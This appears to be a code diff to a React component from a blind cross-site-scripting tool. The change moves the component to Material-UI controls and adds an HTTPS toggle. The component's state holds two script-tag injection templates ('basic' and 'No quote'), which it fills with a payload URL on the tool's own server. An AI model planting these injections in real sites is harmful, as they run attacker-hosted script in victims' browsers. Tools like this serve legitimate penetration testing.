@@ -2,6 +2,7 @@ import React from 'react';
 import axios from 'axios';
 
 import { API_PAYLOADS, URL_PAYLOAD} from "../helpers/constants"
+import { Table, TableCell, TableRow, TableHead, Checkbox, Select} from '@material-ui/core';
 
 const REPLACE_TAG = "##URL_ID_PAYLOAD_OR_ALIAS##"
 
@@ -12,6 +13,7 @@ export default class InjectionsList extends React.Component {
             currentAlias : "",
             aliasesOrPayloadsIDs: [""],
             useSubdomain: false,
+            useHTTPS: true,
             injections: [
                 {"title":"basic", "content": `"><script src="##URL_ID_PAYLOAD_OR_ALIAS##"></script>`},
                 {"title": "No quote", "content": `<script src=##URL_ID_PAYLOAD_OR_ALIAS##></script>`}
@@ -20,14 +22,18 @@ export default class InjectionsList extends React.Component {
     };
     // is this ugly? I have no idea if I should move this function elsewhere.
     // I need to keep the this (to set the state)
-    getReplacement = () => {
-        var s = document.getElementById("injectionSelect");
-        this.setState({currentAlias: s.options[s.selectedIndex].value});
+    getReplacement = (event) => {
+        let s = event.target.value
+        if (!s){
+            s = ""
+        }
+        this.setState({currentAlias: s});
     }
-    toggleSubdomain = () =>{
-        var checked = document.getElementById("useSubdomain").checked;
-        this.setState({ useSubdomain: checked });
-        console.log(checked)
+    toggleSubdomain = (event) =>{
+        this.setState({ useSubdomain: event.target.checked });
+    }
+    toggleHTTPS = (event) =>{
+        this.setState({ useHTTPS: event.target.checked });
     }
     
     componentDidMount() {
@@ -57,7 +63,7 @@ export default class InjectionsList extends React.Component {
     createInjection = (injection) => {
         var url = ""
         if (this.state.useSubdomain) {
-            url = "https://" + this.state.currentAlias + "." + window.location.hostname // + ":" + window.location.port;
+            url = "http"+(this.state.useHTTPS ? "s":"")+"://" + this.state.currentAlias + "." + window.location.hostname // + ":" + window.location.port;
         }else {
             url = URL_PAYLOAD + this.state.currentAlias;
         }
@@ -72,10 +78,10 @@ export default class InjectionsList extends React.Component {
     }
     render() {
         return (
-            <div className="Injections">
+            <div>
                 <div>Injections:</div>
-                Payload ID and/or alias: 
-                <select id="injectionSelect" onChange={this.getReplacement}>
+                Payload ID and/or alias:
+                <Select onChange={this.getReplacement}>
                     {
                         this.state.aliasesOrPayloadsIDs.map((aop) => {
                             return (
@@ -83,23 +89,40 @@ export default class InjectionsList extends React.Component {
                             )
                         })
                     }
-                </select>
+                </Select>
                 <br />
                 Use subdomain:
-                <br/>
-                <input type="checkbox" id="useSubdomain" onChange={this.toggleSubdomain}></input>
-                <ul>
-                {
-                    this.state.injections.map((injection) => {
-                        return (
-                            <div>
-                                <span>{injection.title}</span>
-                                <li>{this.createInjection(injection.content)}</li>
-                            </div>
-                        )
-                    })
-                }
-                </ul>
+                <Checkbox
+                    value="useSubdomain"
+                    inputProps={{ 'aria-label': 'Use Subdomain' }}
+                    onChange={this.toggleSubdomain}
+                    color="default"
+                />
+                Use HTTPS:
+                <Checkbox
+                    value="useHTTPS"
+                    inputProps={{ 'aria-label': 'Use HTTPS' }}
+                    onChange={this.toggleHTTPS}
+                    color="default"
+                    defaultChecked
+                />
+                {/* <input type="checkbox" id="useSubdomain" onChange={this.toggleSubdomain}></input> */}
+                <Table className="table" aria-label="simple table">
+                    <TableHead>
+                        <TableCell>Name</TableCell>
+                        <TableCell>Injection</TableCell>
+                    </TableHead>
+                    {
+                        this.state.injections.map((injection) => {
+                            return (
+                            <TableRow>
+                                <TableCell>{injection.title}</TableCell>
+                                <TableCell>{this.createInjection(injection.content)}</TableCell>
+                            </TableRow>
+                            )
+                        })
+                    }
+                </Table>
             </div>
         );
     };
